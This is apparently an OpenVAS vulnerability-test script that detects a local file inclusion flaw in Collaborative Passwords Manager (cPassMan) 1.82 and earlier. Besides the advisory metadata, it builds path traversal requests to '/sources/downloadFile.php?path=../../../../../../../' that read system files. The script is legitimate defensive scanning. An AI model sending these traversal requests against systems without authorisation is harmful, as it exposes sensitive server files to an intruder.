###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_collaborative_passwords_manager_lfi_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Collaborative Passwords Manager (cPassMan) 'path' Local File Inclusion Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to obtain potentially sensitive
  information and to execute arbitrary local scripts in the context of the
  web server process.
  Impact Level: Application/System";
tag_affected = "Collaborative Passwords Manager (cPassMan) 1.82 and prior";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the 'path'
  parameter to '/sources/downloadfile.php', that allows remote attackers to view
  files and execute local scripts in the context of the webserver.";
tag_solution = "upgrade  Collaborative Passwords Manager (cPassMan) to 2.0 or later,
  For updates refer to http://sourceforge.net/projects/communitypasswo/files/";
tag_summary = "This host is running Collaborative Passwords Manager (cPassMan) and
  is prone to local file inclusion vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801923");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-04-26 15:24:49 +0200 (Tue, 26 Apr 2011)");
  script_bugtraq_id(47379);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Collaborative Passwords Manager (cPassMan) 'path' Local File Inclusion Vulnerability");
  script_xref(name : "URL" , value : "http://safe-host.info/?p=555");
  script_xref(name : "URL" , value : "http://sec.jetlib.com/Full_Disclosure/2011/04/14/cPassMan_v1.82_Arbitrary_File_Download_-SOS-11-004");
  script_xref(name : "URL" , value : "http://www.zataz.com/mailing-securite/1302836181/%5BFull-disclosure%5D-cPassMan-v1.82-Arbitrary-File-Download---SOS-11-004.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_passman_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cpassman/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (!can_host_php(port:port)){
  exit(0);
}

if(!dir = get_dir_from_kb(port:port,app:"passman"))exit(0);

 if( dir == "/" ) dir = "";
 res = http_get_cache(item:string(dir,"/index.php"), port:port);
 
 ## Confirm the application
 if('<title>Collaborative Passwords Manager</title>' >< res)
 {
   files = traversal_files();
   
   foreach file (keys(files))
   {
     ## Contstuct exploit string       
     url = string(dir, "/sources/downloadFile.php" +
                       "?path=../../../../../../../",files[file]);
     
     ## Confirm exploit worked properly or not
     if(http_vuln_check(port:port, url:url, pattern:file))
     {
       security_message(port:port);
       exit(0);
     }    
   }
 }

